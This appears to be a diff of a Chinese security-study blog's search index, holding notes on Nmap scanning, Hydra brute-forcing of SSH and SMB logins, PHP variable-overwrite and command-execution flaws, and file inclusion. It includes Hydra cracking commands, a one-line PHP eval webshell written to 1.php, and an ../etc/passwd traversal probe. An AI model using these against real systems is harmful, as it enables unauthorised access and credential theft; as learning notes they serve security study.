+<h2 id="把Nmap扫描结果保存到本地"><a href="#把Nmap扫描结果保存到本地" class="headerlink" title="把Nmap扫描结果保存到本地"></a>把Nmap扫描结果保存到本地</h2><h3 id="一、标准保存"><a href="#一、标准保存" class="headerlink" title="一、标准保存"></a>一、标准保存</h3><p>命令:<br>nmap –oN test.txt shop.aqlab.cn<br>标准保存会包输出结果保存到指定文件</p>
+<h3 id="二、保存为xml格式"><a href="#二、保存为xml格式" class="headerlink" title="二、保存为xml格式"></a>二、保存为xml格式</h3><p>命令:<br>nmap –oX test.xml shop.aqlab.cn<br>保存为xml格式需要用浏览器打开，查看结果</p>
+<h1 id="Hydra-九头蛇"><a href="#Hydra-九头蛇" class="headerlink" title="Hydra(九头蛇)"></a>Hydra(九头蛇)</h1><h2 id="命令"><a href="#命令" class="headerlink" title="命令:"></a>命令:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常用:</span><br><span class="line">-l root    指定用户名</span><br><span class="line">-L    指定用户名字典 </span><br><span class="line"></span><br><span class="line">-p     指定密码</span><br><span class="line">-P      指定密码字典</span><br><span class="line"></span><br><span class="line">-s   指定非默认端口</span><br><span class="line">ssh 22 /1900</span><br></pre></td></tr></table></figure>
+<p>-l LOGIN     指定破解的用户名称，对特定用户破解。<br>-L FILE     从文件中加载用户名进行破解。<br>-p PASS    小写p指定密码破解，少用，一般是采用密码字典。<br>-P FILE     大写字母P，指定密码字典。<br>-e nsr     可选选项，n：空密码试探，s：使用指定用户和密码试探，r：指定密码与用户名相反。<br>-C FILE     使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。<br>-t TASKS     同时运行的连接的线程数，每一台主机默认为16。<br>-M FILE     指定服务器目标列表文件一行一条<br>-w TIME     设置最大超时的时间，单位秒，默认是30s。<br>-o FILE     指定结果输出文件。<br>-f     在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。<br>-v / -V     显示详细过程。<br>-R     继续从上一次进度接着破解。<br>-S     采用SSL链接。<br>-s PORT     可通过这个参数指定非默认端口。<br>-U       服务模块使用细节<br>-h       更多的命令行选项（完整的帮助）<br>server      目标服务器名称或者IP（使用这个或-M选项）<br>service     指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http[s]-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等</p>
+<p>OPT       一些服务模块支持额外的输入（-U用于模块的帮助）</p>
+<h2 id="win密码破解"><a href="#win密码破解" class="headerlink" title="win密码破解"></a>win密码破解</h2><p>SMB服务很稳定，跑得快，不容易ban掉ip<br>hydra -l 用户名 -p 密码 smb://ip –v<br>或者hydra -l 用户名 -p 密码 ip smb –v   </p>
+<h2 id="破解ssh"><a href="#破解ssh" class="headerlink" title="破解ssh"></a>破解ssh</h2><p>hydra -l 用户名 -P 密码字典 -t 线程 -vV -e nsr ip ssh<br>hydra -l 用户名 -P 密码字典 -t 线程 -o save.log -vV ip ssh<br>命令详细：<br>攻击目标：192.168.1.12<br>使用的模块：ssh<br>爆破用户名：root(-l)<br>使用的密码字典：/root/passwd.txt (-P)<br>爆破线程数：6 (-t)<br>显示详细信息 (-V)<br>爆破成功一个后停止 (-f)</p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>渗透工具</tag>
+        <tag>内网</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>内网渗透</title>
     <url>/2023/08/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
     <content><![CDATA[<p>SQL注入：拿到了数据库信息、拿到了管理员账号密码。然后找不到后台。<br>SQL注入  Getshell =&gt; DNS注入的课程<br>    <strong>into dumpfile</strong>  =&gt; 将SQL语句执行结果导出到XXX文件<br>    <strong>into outfile</strong>      =&gt; 将SQL语句执行结果导出到XXX文件<br>        into dumpfile ‘c:/phpstudy/www/77.php’</p>
@@ -1030,31 +1058,35 @@
       </tags>
   </entry>
   <entry>
-    <title>内网信息收集(Nmap与Hydra)</title>
-    <url>/2023/08/21/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-Nmap%E4%B8%8EHydra/</url>
-    <content><![CDATA[<p>官方脚本：<br><a href="https://svn.nmap.org/nmap/scripts/">https://svn.nmap.org/nmap/scripts/</a><br>CVE查询：<br><a href="http://cve.scap.org.cn/">http://cve.scap.org.cn/</a><br><a href="http://cve.mitre.org/">http://cve.mitre.org/</a></p>
-<h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a><strong>nmap</strong></h1><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>一 、检测存活在网络上的主机（主机发现）<br>二、 检测主机上开放的端口（端口发现或枚举）<br>三、 检测到相应的端口（服务发现）的软件和版本<br>四、 检测操作系统，硬件地址，以及软件版本<br>五、 检测脆弱性的漏洞（Nmap的脚本）</p>
-<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>-sS :     TCP SYN扫描<br>-p:         指定端口号扫描<br>-v：      显示扫描过程<br>-F：    快速扫描<br>-Pn：   禁止ping后扫描: 跳过主机发现的过程进行端口扫描<br>-A：     全面的系统扫描:包括打开操作系统探测、版本探测、脚本扫描、路径跟踪</p>
-<h2 id="扫描指定IP开放端口命令"><a href="#扫描指定IP开放端口命令" class="headerlink" title="扫描指定IP开放端口命令:"></a>扫描指定IP开放端口命令:</h2><p>nmap –sS -p 端口号 -v 192.168.1.2<br>使用半开放扫描，指定端口号1-65535，显示扫描过程</p>
-<h2 id="穿透防火墙扫描命令："><a href="#穿透防火墙扫描命令：" class="headerlink" title="穿透防火墙扫描命令："></a>穿透防火墙扫描命令：</h2><p>nmap –Pn/P0 -A 192.168.1.2<br>服务器禁止ping命令，试试-Pn，nmap参数配合使用</p>
-<h2 id="常用的端口扫描指令"><a href="#常用的端口扫描指令" class="headerlink" title="常用的端口扫描指令"></a>常用的端口扫描指令</h2><p>-sU :        UDP扫描（不可靠）<br>-sT:          TCP扫描<br>-sV：        扫描系统版本和程序版本检测<br>-T4：        默认3，越高扫描越快，但也容易被防火墙或IDS检测并屏蔽掉<br>-R:        反向域名解析<br>-sL—script=vuln     扫描常见的漏洞</p>
-<h2 id="漏洞扫描命令"><a href="#漏洞扫描命令" class="headerlink" title="漏洞扫描命令:"></a>漏洞扫描命令:</h2><p>nmap —script=vuln 192.168.1.2<br>使用vuln脚本进行常见的漏洞扫描</p>
-<h2 id="指纹识别扫描命令："><a href="#指纹识别扫描命令：" class="headerlink" title="指纹识别扫描命令："></a>指纹识别扫描命令：</h2><p>nmap -sV -v 192.168.1.2<br>扫描系统和程序版本号检测，并且输出详细信息</p>
-<h2 id="端口扫描的状态"><a href="#端口扫描的状态" class="headerlink" title="端口扫描的状态"></a>端口扫描的状态</h2><p>Opend：端口开启<br>Closed：  端口关闭<br>Filtered：端口被过滤，数据没有到达主机，返回的结果为空，数据被防火墙拦截了<br>Unfiltered：未被过滤，数据有到达主机，但是不能识别端口的当前状态<br>Open|filtered：开放或者被过滤，端口没有返回值，主要发生在UDP、IP、FIN、NULL和Xmas扫描中<br>Closed|filtered：关闭或者被过滤，只发生在IP ID idle扫描</p>
-<h2 id="把Nmap扫描结果保存到本地"><a href="#把Nmap扫描结果保存到本地" class="headerlink" title="把Nmap扫描结果保存到本地"></a>把Nmap扫描结果保存到本地</h2><h3 id="一、标准保存"><a href="#一、标准保存" class="headerlink" title="一、标准保存"></a>一、标准保存</h3><p>命令:<br>nmap –oN test.txt shop.aqlab.cn<br>标准保存会包输出结果保存到指定文件</p>
-<h3 id="二、保存为xml格式"><a href="#二、保存为xml格式" class="headerlink" title="二、保存为xml格式"></a>二、保存为xml格式</h3><p>命令:<br>nmap –oX test.xml shop.aqlab.cn<br>保存为xml格式需要用浏览器打开，查看结果</p>
-<h1 id="Hydra-九头蛇"><a href="#Hydra-九头蛇" class="headerlink" title="Hydra(九头蛇)"></a>Hydra(九头蛇)</h1><h2 id="命令"><a href="#命令" class="headerlink" title="命令:"></a>命令:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常用:</span><br><span class="line">-l root    指定用户名</span><br><span class="line">-L    指定用户名字典 </span><br><span class="line"></span><br><span class="line">-p     指定密码</span><br><span class="line">-P      指定密码字典</span><br><span class="line"></span><br><span class="line">-s   指定非默认端口</span><br><span class="line">ssh 22 /1900</span><br></pre></td></tr></table></figure>
-<p>-l LOGIN     指定破解的用户名称，对特定用户破解。<br>-L FILE     从文件中加载用户名进行破解。<br>-p PASS    小写p指定密码破解，少用，一般是采用密码字典。<br>-P FILE     大写字母P，指定密码字典。<br>-e nsr     可选选项，n：空密码试探，s：使用指定用户和密码试探，r：指定密码与用户名相反。<br>-C FILE     使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。<br>-t TASKS     同时运行的连接的线程数，每一台主机默认为16。<br>-M FILE     指定服务器目标列表文件一行一条<br>-w TIME     设置最大超时的时间，单位秒，默认是30s。<br>-o FILE     指定结果输出文件。<br>-f     在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。<br>-v / -V     显示详细过程。<br>-R     继续从上一次进度接着破解。<br>-S     采用SSL链接。<br>-s PORT     可通过这个参数指定非默认端口。<br>-U       服务模块使用细节<br>-h       更多的命令行选项（完整的帮助）<br>server      目标服务器名称或者IP（使用这个或-M选项）<br>service     指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http[s]-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等</p>
-<p>OPT       一些服务模块支持额外的输入（-U用于模块的帮助）</p>
-<h2 id="win密码破解"><a href="#win密码破解" class="headerlink" title="win密码破解"></a>win密码破解</h2><p>SMB服务很稳定，跑得快，不容易ban掉ip<br>hydra -l 用户名 -p 密码 smb://ip –v<br>或者hydra -l 用户名 -p 密码 ip smb –v   </p>
-<h2 id="破解ssh"><a href="#破解ssh" class="headerlink" title="破解ssh"></a>破解ssh</h2><p>hydra -l 用户名 -P 密码字典 -t 线程 -vV -e nsr ip ssh<br>hydra -l 用户名 -P 密码字典 -t 线程 -o save.log -vV ip ssh<br>命令详细：<br>攻击目标：192.168.1.12<br>使用的模块：ssh<br>爆破用户名：root(-l)<br>使用的密码字典：/root/passwd.txt (-P)<br>爆破线程数：6 (-t)<br>显示详细信息 (-V)<br>爆破成功一个后停止 (-f)</p>
+    <title>变量覆盖漏洞</title>
+    <url>/2023/08/21/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="变量覆盖的定义"><a href="#变量覆盖的定义" class="headerlink" title="变量覆盖的定义:"></a>变量覆盖的定义:</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="number">2</span>;<span class="comment">//变量覆盖</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>变量覆盖漏洞有的时候可以直接让我们获取Webshell，拿到服务器的权限</p>
+<h1 id="如何寻找"><a href="#如何寻找" class="headerlink" title="如何寻找?"></a>如何寻找?</h1><p>经常导致变量覆盖漏洞场景有：$$使用不当，extract()函数使用不当,parse_str()函数使用不当import_request_variables()使用不当，开启了全局变量注册等。</p>
+<h2 id="1-extract"><a href="#1-extract" class="headerlink" title="1.extract()"></a>1.extract()</h2><p><strong>把数组变成变量</strong>, 数组里的键是变量名, 值是变量值<br>所以extract($_GET) =&gt; 所有的传参都是变量</p>
+<h2 id="2-parse-str"><a href="#2-parse-str" class="headerlink" title="2.parse_str()"></a>2.parse_str()</h2><p><strong>把字符串变成变量</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">parse_str</span>(<span class="string">&quot;name=zkaq&amp;&amp;age=60&quot;</span>);   <span class="comment">// test=123&amp;gift=123</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$age</span>;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="3-双美元符号"><a href="#3-双美元符号" class="headerlink" title="3.双美元符号"></a>3.双美元符号</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span> =<span class="string">&#x27;d&#x27;</span>;</span><br><span class="line"><span class="variable">$d</span> =<span class="string">&#x27;e&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$$$a</span>;</span><br></pre></td></tr></table></figure>
+<h1 id="键值分离"><a href="#键值分离" class="headerlink" title="键值分离"></a>键值分离</h1><p>foreach(数组 as 你命名的代表键的变量名=&gt;你命名的代表值的变量名)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	foreach(array(&quot;a&quot;=&gt;&quot;cat&quot;,&quot;b&quot;=&gt;&quot;dog&quot;)) as $_key =&gt; $_value&#123;</span><br><span class="line">		echo $_key.&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">		echo $_value.&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line">//将数组键值分离</span><br></pre></td></tr></table></figure>
+<h1 id="session和cookie"><a href="#session和cookie" class="headerlink" title="session和cookie"></a>session和cookie</h1><p>SESSION =&gt; 服务端识别身份的东西 =&gt; 公交刷卡系统<br>COOKIE =&gt; 客户端识别身份的东西 =&gt; 公交卡</p>
+<p>Cookie的本质是随机字符串    //PHPSESSION=NF<br>任何人访问网站都有Cookie<br>大部分的网站，<strong>登陆前后，Cookie是不变的。核心Cookie是不变</strong>。</p>
+<p>登录 变的是SESSION</p>
+<p>登录网站成功后，校验账号密码通过后，他会给你的Cookie赋值上SESSION，然后你就可以拿着你被Cookie进入后台</p>
+<p>SESSION有两个条件；<br>1、必须开启session<br>2、SESSION只能是通过变量赋值的方式产生</p>
+<p>SESSION必须开启的时候才能用</p>
+<p>SESSION开启的PHP文件</p>
+<p>session_start()</p>
+<p>创建什么样的SESSION？<br>1、分析代码<br>2、尝试法</p>
+<p>绝大部分网站，管理员都叫admin \ 管理员用户ID 1 \权限都是管理员</p>
+<p>判断权限是需要代码去判断</p>
+<p>if(SESSION=XXXXX值 他是管理员 SESSION=YYYYY 他是用户)</p>
 ]]></content>
       <categories>
-        <category>内网渗透</category>
+        <category>web渗透</category>
       </categories>
       <tags>
-        <tag>渗透工具</tag>
-        <tag>内网</tag>
+        <tag>变量覆盖漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1084,28 +1116,6 @@
       </categories>
       <tags>
         <tag>反序列化漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>命令执行漏洞</title>
-    <url>/2023/08/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="命令执行漏洞定义"><a href="#命令执行漏洞定义" class="headerlink" title="命令执行漏洞定义"></a>命令执行漏洞定义</h1><p>用户输入的数据被当做系统命令(cmd/bash)执行<br>whoami / net user / tasklist / xxx</p>
-<p>dir / ls / rm -rf</p>
-<h1 id="多行命令执行："><a href="#多行命令执行：" class="headerlink" title="多行命令执行："></a>多行命令执行：</h1><p>whoami&amp;net user&amp;ipconfig</p>
-<p>拿到了命令执行漏洞后还可能想要webshell</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="number">123</span> &gt; <span class="number">777</span>.txt</span><br><span class="line">可以尝试cmd的输出命令	<span class="keyword">echo</span> “<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">8</span>])<span class="meta">?&gt;</span>” &gt;<span class="number">1</span>.php	</span><br><span class="line">netstat -ano &gt; <span class="number">1</span>.txt </span><br><span class="line">disable_function PHP的禁用函数</span><br></pre></td></tr></table></figure>
-<h1 id="命令执行函数："><a href="#命令执行函数：" class="headerlink" title="命令执行函数："></a>命令执行函数：</h1><p>system()  执行系统命令,直接输出</p>
-<p>echo exec()    执行系统命令,没有输出,输出最后一行。</p>
-<p>echo shell_exec(‘whoami’); 执行系统命令,没有输出,可以输出多行</p>
-<p>echo `whoami`             //(反引号)与shell_exec 效果完全相同【调用,即简写】</p>
-<p>passthru //只调用命令,他和system差不多</p>
-<p>popen // 比较特殊的存在 [disable_function 是可以绕的]<br>        $a = popen(‘whoami’,’r’);         //返回的是一个文件的指针地址( //r是只读、w是写入)<br>        echo fread($a,1024);</p>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>命令执行漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1141,35 +1151,25 @@
       </tags>
   </entry>
   <entry>
-    <title>变量覆盖漏洞</title>
-    <url>/2023/08/21/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="变量覆盖的定义"><a href="#变量覆盖的定义" class="headerlink" title="变量覆盖的定义:"></a>变量覆盖的定义:</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="number">2</span>;<span class="comment">//变量覆盖</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>变量覆盖漏洞有的时候可以直接让我们获取Webshell，拿到服务器的权限</p>
-<h1 id="如何寻找"><a href="#如何寻找" class="headerlink" title="如何寻找?"></a>如何寻找?</h1><p>经常导致变量覆盖漏洞场景有：$$使用不当，extract()函数使用不当,parse_str()函数使用不当import_request_variables()使用不当，开启了全局变量注册等。</p>
-<h2 id="1-extract"><a href="#1-extract" class="headerlink" title="1.extract()"></a>1.extract()</h2><p><strong>把数组变成变量</strong>, 数组里的键是变量名, 值是变量值<br>所以extract($_GET) =&gt; 所有的传参都是变量</p>
-<h2 id="2-parse-str"><a href="#2-parse-str" class="headerlink" title="2.parse_str()"></a>2.parse_str()</h2><p><strong>把字符串变成变量</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">parse_str</span>(<span class="string">&quot;name=zkaq&amp;&amp;age=60&quot;</span>);   <span class="comment">// test=123&amp;gift=123</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$age</span>;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="3-双美元符号"><a href="#3-双美元符号" class="headerlink" title="3.双美元符号"></a>3.双美元符号</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span> =<span class="string">&#x27;d&#x27;</span>;</span><br><span class="line"><span class="variable">$d</span> =<span class="string">&#x27;e&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$$$a</span>;</span><br></pre></td></tr></table></figure>
-<h1 id="键值分离"><a href="#键值分离" class="headerlink" title="键值分离"></a>键值分离</h1><p>foreach(数组 as 你命名的代表键的变量名=&gt;你命名的代表值的变量名)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	foreach(array(&quot;a&quot;=&gt;&quot;cat&quot;,&quot;b&quot;=&gt;&quot;dog&quot;)) as $_key =&gt; $_value&#123;</span><br><span class="line">		echo $_key.&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">		echo $_value.&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line">//将数组键值分离</span><br></pre></td></tr></table></figure>
-<h1 id="session和cookie"><a href="#session和cookie" class="headerlink" title="session和cookie"></a>session和cookie</h1><p>SESSION =&gt; 服务端识别身份的东西 =&gt; 公交刷卡系统<br>COOKIE =&gt; 客户端识别身份的东西 =&gt; 公交卡</p>
-<p>Cookie的本质是随机字符串    //PHPSESSION=NF<br>任何人访问网站都有Cookie<br>大部分的网站，<strong>登陆前后，Cookie是不变的。核心Cookie是不变</strong>。</p>
-<p>登录 变的是SESSION</p>
-<p>登录网站成功后，校验账号密码通过后，他会给你的Cookie赋值上SESSION，然后你就可以拿着你被Cookie进入后台</p>
-<p>SESSION有两个条件；<br>1、必须开启session<br>2、SESSION只能是通过变量赋值的方式产生</p>
-<p>SESSION必须开启的时候才能用</p>
-<p>SESSION开启的PHP文件</p>
-<p>session_start()</p>
-<p>创建什么样的SESSION？<br>1、分析代码<br>2、尝试法</p>
-<p>绝大部分网站，管理员都叫admin \ 管理员用户ID 1 \权限都是管理员</p>
-<p>判断权限是需要代码去判断</p>
-<p>if(SESSION=XXXXX值 他是管理员 SESSION=YYYYY 他是用户)</p>
+    <title>命令执行漏洞</title>
+    <url>/2023/08/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="命令执行漏洞定义"><a href="#命令执行漏洞定义" class="headerlink" title="命令执行漏洞定义"></a>命令执行漏洞定义</h1><p>用户输入的数据被当做系统命令(cmd/bash)执行<br>whoami / net user / tasklist / xxx</p>
+<p>dir / ls / rm -rf</p>
+<h1 id="多行命令执行："><a href="#多行命令执行：" class="headerlink" title="多行命令执行："></a>多行命令执行：</h1><p>whoami&amp;net user&amp;ipconfig</p>
+<p>拿到了命令执行漏洞后还可能想要webshell</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="number">123</span> &gt; <span class="number">777</span>.txt</span><br><span class="line">可以尝试cmd的输出命令	<span class="keyword">echo</span> “<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">8</span>])<span class="meta">?&gt;</span>” &gt;<span class="number">1</span>.php	</span><br><span class="line">netstat -ano &gt; <span class="number">1</span>.txt </span><br><span class="line">disable_function PHP的禁用函数</span><br></pre></td></tr></table></figure>
+<h1 id="命令执行函数："><a href="#命令执行函数：" class="headerlink" title="命令执行函数："></a>命令执行函数：</h1><p>system()  执行系统命令,直接输出</p>
+<p>echo exec()    执行系统命令,没有输出,输出最后一行。</p>
+<p>echo shell_exec(‘whoami’); 执行系统命令,没有输出,可以输出多行</p>
+<p>echo `whoami`             //(反引号)与shell_exec 效果完全相同【调用,即简写】</p>
+<p>passthru //只调用命令,他和system差不多</p>
+<p>popen // 比较特殊的存在 [disable_function 是可以绕的]<br>        $a = popen(‘whoami’,’r’);         //返回的是一个文件的指针地址( //r是只读、w是写入)<br>        echo fread($a,1024);</p>
 ]]></content>
       <categories>
         <category>web渗透</category>
       </categories>
       <tags>
-        <tag>变量覆盖漏洞</tag>
+        <tag>命令执行漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1257,34 +1257,6 @@
       </tags>
   </entry>
   <entry>
-    <title>文件包含漏洞</title>
-    <url>/2023/08/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>攻击者利用包含的特性，加上应用本身对文件（包含）控制不严格，最终造成攻击者进行任意文件包含。（注：包含的文件会被当成脚本文件来解析）</p>
-<h2 id="LFI-本地文件包含"><a href="#LFI-本地文件包含" class="headerlink" title="LFI :本地文件包含"></a>LFI :本地文件包含</h2><p> 本地文件包含(只能包含目标计算机上有的文件)</p>
-<h2 id="RFI-远程文件包含"><a href="#RFI-远程文件包含" class="headerlink" title="RFI : 远程文件包含"></a>RFI : 远程文件包含</h2><p>远程文件包含（木马在别人的电脑上我也能包含）  罕见</p>
-<h1 id="易混淆的重点"><a href="#易混淆的重点" class="headerlink" title="易混淆的重点:"></a>易混淆的重点:</h1><p>文件包含是开发必备的功能,本身不是漏洞,但是任意文件包含就是漏洞;<br>同理,代码执行不是漏洞,任意代码执行才是漏洞</p>
-<h1 id="文件包含的本质："><a href="#文件包含的本质：" class="headerlink" title="文件包含的本质："></a>文件包含的本质：</h1><p>去除代码的冗余性<br>比如:a.php里面写好了数据库连接的函数,b.php中需要数据库的操作时,直接引用a.php就行</p>
-<h1 id="四个PHP的引用函数"><a href="#四个PHP的引用函数" class="headerlink" title="四个PHP的引用函数"></a>四个PHP的引用函数</h1><h2 id="include-出现几次就包含几次"><a href="#include-出现几次就包含几次" class="headerlink" title="include[出现几次就包含几次]"></a>include[出现几次就包含几次]</h2><p>使用include引用外部文件时，只有代码执行到include代码段时，调用的外部文件才会被引用并读取，当引用的文件发生错误时，系统只会给出个警告错误，而整个php文件会继续执行。</p>
-<h2 id="require"><a href="#require" class="headerlink" title="require"></a>require</h2><p>在php文件被执行之前，php解析器会让被引用的文件的全部内容替换require语句，然后与require语句之外的其他语句组成个新的php文件，最好后按新的php文件执行程序代码。</p>
-<h2 id="include-once-once只在乎是否之前被包含过-不在乎是用require还是include还是-once"><a href="#include-once-once只在乎是否之前被包含过-不在乎是用require还是include还是-once" class="headerlink" title="include_once [_once只在乎是否之前被包含过,不在乎是用require还是include还是_once]"></a>include_once [_once只在乎是否之前被包含过,不在乎是用require还是include还是_once]</h2><p>在导入文件前先检测该文件是否在该页面的其他部分被引用过，如果有，则不会重复引用该文件，程序只能引用一次。（要导入的文件中存在一些自定义函数，那么如果在同一个程序中重复导入这个文件，在第二次导入时便会发生错误，因为php不允许相同名称的函数被重复声明）</p>
-<h2 id="require-once"><a href="#require-once" class="headerlink" title="require_once"></a>require_once</h2><p>是require语句的延伸，他的功能与require语句基本一致，不同的是，在应用require_once时，先会检查要引用的文件是不是已将在该程序中的其他地方被引用过，如果有，则不会在重复调用该文件。（同时使用require_once语句在同一页面中引用了两个相同的文件，那么在输出时，只有第一个文件被执行，第二个引用的文件则不会被执行）</p>
-<h2 id="（包含不存在文件的时候-include可以继续执行，require不可以）"><a href="#（包含不存在文件的时候-include可以继续执行，require不可以）" class="headerlink" title="（包含不存在文件的时候,include可以继续执行，require不可以）"></a>（包含不存在文件的时候,include可以继续执行，require不可以）</h2><h1 id="文件包含不区分文件后缀且不仅局限于包含根目录"><a href="#文件包含不区分文件后缀且不仅局限于包含根目录" class="headerlink" title="文件包含不区分文件后缀且不仅局限于包含根目录"></a>文件包含不区分文件后缀且不仅局限于包含根目录</h1><p>比如1.txt内是php代码,2.php包含1.txt时,页面会运行1.txt内的PHP语句</p>
-<p>同时,被包含的文件可以不存在于网站根目录,因为是通过函数和路径去寻找并包含的; 然而解析漏洞只能将木马上传到网站的目录下才可以getshell.</p>
-<h1 id="如何寻找文件包含漏洞"><a href="#如何寻找文件包含漏洞" class="headerlink" title="如何寻找文件包含漏洞"></a>如何寻找文件包含漏洞</h1><h2 id="1-代码审计"><a href="#1-代码审计" class="headerlink" title="1.代码审计"></a>1.代码审计</h2><h2 id="2-当传参里出现XX-XX-比如index-php-XX-php"><a href="#2-当传参里出现XX-XX-比如index-php-XX-php" class="headerlink" title="2.当传参里出现XX.XX,比如index.php,XX.php"></a>2.当传参里出现XX.XX,比如index.php,XX.php</h2><p>(1)文件包含漏洞<br>(2)任意文件读取漏洞<br>(3)任意文件下载漏洞</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.XX.com/download/downfile.asp?filename=123.pdf </span><br><span class="line">可以尝试操作系统的敏感路径,比如../../../../etc/passwd或者window的各种敏感目录</span><br></pre></td></tr></table></figure>
-<h1 id="防御策略"><a href="#防御策略" class="headerlink" title="防御策略"></a>防御策略</h1><p>1、无需情况下设置allow_url_include和allow_url_fopen为关闭</p>
-<p>2、对可以包含的文件进行限制，可以使用白名单的方式，或者设置可以包含的目录，如open_basedir</p>
-<p>3、建议假定所有输入都是可疑的，尝试对所有输入提交可能可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现../之类的目录跳转符。</p>
-<p>4、严格检查include类的文件包含函数中的参数是否外界可控。</p>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>文件包含漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>渗透测试常用工具</title>
